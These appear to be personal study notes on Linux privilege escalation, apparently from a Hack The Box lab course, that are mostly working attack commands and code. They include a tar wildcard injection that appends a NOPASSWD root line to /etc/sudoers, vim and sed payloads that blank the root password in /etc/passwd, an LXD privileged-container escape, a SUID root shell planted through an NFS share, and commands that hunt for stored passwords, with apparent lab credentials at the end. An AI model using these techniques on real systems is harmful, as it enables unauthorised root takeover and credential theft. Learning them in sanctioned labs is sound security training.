# Introduction to Linux Privilege Escalation


when we audit a linux system we have to look for the OS version, the Kernel version, and running services

to have root processes

```sh
ps aux | grep root
```

also Installed Packages and Versions, Logged in users

try to ls home ...etc

look for ssh keys 

```sh
ls -l ~/.ssh
```

bash history 
try `sudo -l`

try to read /etc/passwd maybe we can find a hash 
See cron JOBs that's what i need to see.

```sh
ls -la /etc/cron.daily/
```
File Systems & Additional Drives wirh `lsblk`

Set uid and getgid and writable permission files 
```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```
for files 
```sh
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
## OS info 

```bash
cat /cat /etc/os-release
echo $PATH
env
uname -a
lscpu  # cpu version
cat /etc/shells
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student # hidden files
find / -type d -name ".*" -ls 2>/dev/null # hidden directories
ls -l /tmp /var/tmp /dev/shm
```
## Linux Services & Internals Enumeration

check ip a and ip route 

cat /etc/hosts

check lastlogs

check this command w and history
check if there is any history file

```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

check the crontab

    ls -la /etc/cron.daily/


good command t check for gtobin and installed packets 

```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

look for configuration files 

```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

find scripts 
```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

## Credential Hunting

```bash
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

ls ~/.ssh

find / -type f -name "wp-config.php" -exec grep -H "DB_USER\|DB_PASSWORD" {} \; 2>/dev/null
```

## TAR abuse 

for example in tar command if we have a wild card used as root, or in a cron job example 

```bash
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

if we write this 

```bash
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

 --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options and the script if executed

 ## Special Permissions

 The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.

 ```bash
 find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

find capabilities :

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

payload for vim capabilities for cap_dac_override+eip

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
Or to remove root password, 

```bash
sed -i 's/^root:x:/root::/' /etc/passwd
```

## CronJobs

Cron jobs can also be set to run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The crontab command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in /var/spool/cron for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.

We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.

find writable files 

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## LXC

LXC  or linux container is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. 

THe first step is to verify if we belong to the lxd group.

with id
```bash
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
Then download a linux template, and import the image.


```bash
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the security.privileged flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```bash
lxc init ubuntutemp privesc -c security.privileged=true
xc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the resource of the host system as root.

```bash
lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```

## Other techniques:

Tools to snif traffic 

https://github.com/DanMcInerney/net-creds

https://github.com/lgandx/PCredz

## NFS systems

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command showmount -e, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

to see mounts 

```bash
showmount -e IP
```
no_root_squash	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.

Create the following shell

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

we go to TMP and execute the shell after compiling it.


<user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>


define( 'DB_USER', 'admin' );
define( 'DB_PASSWORD', 'WP_admin_s3cure_pass!' );
